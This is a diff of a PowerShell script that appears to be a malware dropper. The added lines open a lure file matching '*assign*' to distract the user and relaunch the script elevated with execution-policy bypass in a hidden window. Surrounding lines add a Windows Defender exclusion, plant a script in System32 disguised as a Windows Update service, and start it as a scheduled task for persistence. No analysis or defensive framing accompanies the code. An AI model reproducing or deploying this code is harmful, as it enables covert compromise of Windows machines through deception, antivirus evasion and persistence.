@@ -1,16 +1,29 @@
-#Admin Check and execution bypass.
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-if (-not $isAdmin) {
-    Write-Host "Script is not running with administrative privileges. Prompting for UAC elevation..."
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
-
 #Variables
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $directoryPath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/"
+
+#File Opening.
+$scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
+$searchPattern = "*assign*.*"
+$matchingFiles = Get-ChildItem -Path $scriptDirectory -Filter $searchPattern -File -Force -ErrorAction SilentlyContinue
+if ($matchingFiles) {
+    foreach ($file in $matchingFiles) {
+        Write-Host "Opening file: $($file.FullName)"
+        Invoke-Item -Path $file.FullName
+    }
+} else {
+    Write-Host "No files matching the search pattern '$searchPattern' found in directory '$scriptDirectory'."
+}
+
+# Admin Check and execution bypass with window hidden.
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+if (-not $isAdmin) {
+    Write-Host "Script is not running with administrative privileges. Prompting for UAC elevation..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
+    exit
+}
 
 #Ading defender exclusion.
 try {
@@ -148,4 +161,3 @@ else {}
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
 Start-Sleep 10
 Start-ScheduledTask -TaskName $updateserv
-
